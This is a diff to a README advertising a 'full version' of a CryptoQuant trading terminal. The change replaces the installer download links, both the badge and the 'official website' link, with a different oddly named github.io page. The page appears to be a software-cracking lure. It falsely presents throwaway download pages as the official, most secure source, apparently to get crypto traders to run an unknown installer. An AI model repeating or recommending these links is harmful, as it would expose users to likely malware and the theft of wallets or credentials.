@@ -2,7 +2,7 @@
 
 CryptoQuant Advanced Terminal Suite is a powerful and comprehensive tool designed for cryptocurrency traders and analysts who want to unlock the full potential of the CryptoQuant platform. With the cryptoquant terminal full version, you gain access to advanced features like real-time data analysis, customizable alerts, and an integrated terminal for seamless operations. This package is ideal for users seeking to enhance their crypto monitoring capabilities without limitations.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -45,6 +45,6 @@ A: This package provides the full version of CryptoQuant Terminal, but you can e
 
 To get started with the CryptoQuant Advanced Terminal Suite, download the installer from our official source. This ensures you receive the latest and most secure version of the software.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For any further questions or support, feel free to reach out through the GitHub issues section or visit our documentation. Happy trading and analysis with CryptoQuant!
